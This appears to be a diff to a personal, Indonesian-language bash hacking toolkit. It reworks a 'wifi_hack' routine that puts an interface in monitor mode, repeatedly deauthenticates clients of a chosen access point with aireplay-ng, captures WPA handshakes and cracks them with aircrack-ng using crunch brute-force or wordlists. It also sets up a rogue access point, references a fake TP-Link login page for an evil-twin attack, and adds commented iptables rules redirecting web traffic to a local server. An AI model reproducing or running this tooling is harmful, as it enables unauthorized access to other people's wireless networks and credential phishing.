@@ -24,7 +24,7 @@ path_apk_empeded="$HOME/oprek/smali"
 path_apk_backup="$HOME/Dokumen/android"
 lib_apk_backup="$allib/build-tools"
 default_apk_build="$allib/build-tools/main"
-ndk="/home/setsuna/android-ndk-r20b" #DON'T use ~/android-ndk-r20b
+ndk="/home/jin/android-ndk-r20b" #DON'T use ~/android-ndk-r20b
 #Distros vars
 known_compatible_distros=(
 							"Wifislax"
@@ -593,11 +593,16 @@ function install_data() {
 
 }
 
-function wifi() {
-
-	nmcli connection add type wifi ifname '*' con-name alice autoconnect no ssid "Server alice"
-    nmcli connection modify alice 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
-    nmcli connection up alice
+function wifi() 
+{
+	read -p "[+] baru? y/n: " wi
+	if [ "$wi" = "y" ]; then
+		nmcli connection add type wifi ifname '*' con-name alice autoconnect no ssid "Server alice"
+    	nmcli connection modify alice 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
+    	nmcli connection up alice
+    else
+    	nmcli connection up alice
+    fi
 }
 
 function xwifi_hack()
@@ -610,19 +615,15 @@ function xwifi_hack()
 }
 function wifi_hack()
 {
-	iwconfig
-	read -p $'\e[31m(Wifihack)\e[0m Interface Name ex wlan0: ' wifin
-	read -p $'\e[31m(Wifihack)\e[0m Monitor? ENTER adalah mon0: ' wifimon
+	echo
+	echo_green_title "************* Wifi hack *****************"
+	echo
 	read -p $'\e[31m(Wifihack)\e[0m Evil/brute e/b? : ' wif
 
-	wifmon="mon0"
 	wifsave="$HOME/Hack/wifi"
 	wiftmp="/tmp/wifihacking"
 	wifserver="$allib/fakelogin/tplink"
 
-	if [ "$wifimon" != "" ]; then
-		wifmon="$wifimon"
-	fi
 	if [ ! -d $wifsave ]; then
 		mkdir -p $wifsave
 	fi
@@ -647,17 +648,39 @@ function wifi_hack()
 		read -p "[+] online/offline? on/of : " wifb
 
 		if [ "$wifb" = "on" ]; then
+			echo
+			iwconfig
+			read -p $'\e[31m(Wifihack)\e[0m Interface Name ex wlan0: ' wifin
+			read -p $'\e[31m(Wifihack)\e[0m Monitor Name ex mon0: ' wifimon
 			airmon-ng start "$wifin"
-			airodump-ng $wifmon
+			airodump-ng $wifimon
 
 			read -p "[+] MAC address: " wifbmac
 			read -p "[+] Nomor channel: " wifbch
 
-			xterm -bg "#000000" -fg "#00AA00" -title "Satu client" -e airodump-ng -c "$wifbch" --bssid "$wifbmac" -w $wiftmp/hand $wifmon &
-			read -p "[+] ENTER untuk kill client: "
-			xterm -bg "#000000" -fg "#FF00A4" -title "Kill" -e aireplay-ng --deauth 5 -a "$wifbmac" --ignore-negative-one $wifmon &
+			xterm -bg "#000000" -fg "#00AA00" -title "Monitor client" -e airodump-ng -c "$wifbch" --bssid "$wifbmac" -w $wiftmp/hand "$wifimon" 2>/dev/null &
+			
+			wklagi="y"
+			while [ $wklagi = "y" ]; do
+				read -p $'\e[31m(Wifihack)\e[0m Kill lagi? y/n: ' klagi
 
-			read -p "[+] ENTER untuk cracking (handsake harus dapat): "
+				if [ "$klagi" = "y" ]; then
+					xterm -bg "#000000" -fg "#FF00A4" -title "Kill" -e aireplay-ng --deauth 5 -a "$wifbmac" --ignore-negative-one "$wifimon" 2>/dev/null &
+				else
+					wklagi="n"
+				fi
+			done
+
+			read -p "[+] simpan handshakes? y/n : " wifbs
+			if [ "$wifbs" = "y" ]; then
+				read -p "[+] Nama handsake : " wifbsn
+				cd $wifsave; mkdir "$wifbsn"
+				cp $wiftmp/* "$wifbsn"
+			else
+				echo "[+] remove all handsake"
+				rm $wiftmp/*
+			fi
+			airmon-ng stop "$wifimon"
 
 			read -p "[+] Punya Wordlist? y/n: " wifbwp
 			if [ "$wifbwp" = "n" ]; then
@@ -669,21 +692,11 @@ function wifi_hack()
 				read -p "[+] Kombi Huruf: " huruf
 				read -p "[+] Nama Wifi: " namawifi
 
-				crunch $pertama $terakhir $huruf --stdout | aircrack-ng -w- $wiftmp/*.cap -e $namawifi
+				crunch $pertama $terakhir "$huruf" --stdout | aircrack-ng -w- $wiftmp/*.cap -e "$namawifi"
 			else
 				ls
 				read -p "[+] ~ Nama file Wordlist word.lst: " wifbw
 				aircrack-ng -w $wifbw -b $wifbmac $wiftmp/*.cap
-			fi
-
-			read -p "[+] simpan handshakes? y/n : " wifbs
-			if [ "$wifbs" = "y" ]; then
-				read -p "[+] Nama handsake : " wifbsn
-				cd $wifsave; mkdir "$wifbsn"
-				mv $wiftmp/* "$wifbsn"
-			else
-				echo "[+] remove all handsake"
-				rm $wiftmp/*
 			fi
 
 		elif [ "$wifb" = "of" ]; then
@@ -699,7 +712,7 @@ function wifi_hack()
 
 				ls $wifsave
 				read -p "[+] Nama handsake wifi : " wifbh
-				crunch $pertama $terakhir $huruf --stdout | aircrack-ng -w- $wifsave/$wifbh/*.cap -e $namawifi
+				crunch $pertama $terakhir "$huruf" --stdout | aircrack-ng -w- $wifsave/$wifbh/*.cap -e "$namawifi"
 			else
 				ls
 				read -p "[+] ~ Nama Wordlist *.txt : " wifbw
@@ -924,3 +937,7 @@ else
 
 fi
 
+#iptables -A FORWARD -p udp --dport 53 -j ACCEPT
+#iptables -A FORWARD -p udp --sport 53 -j ACCEPT
+#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination localhost:8080
+#iptables -P FORWARD DROP
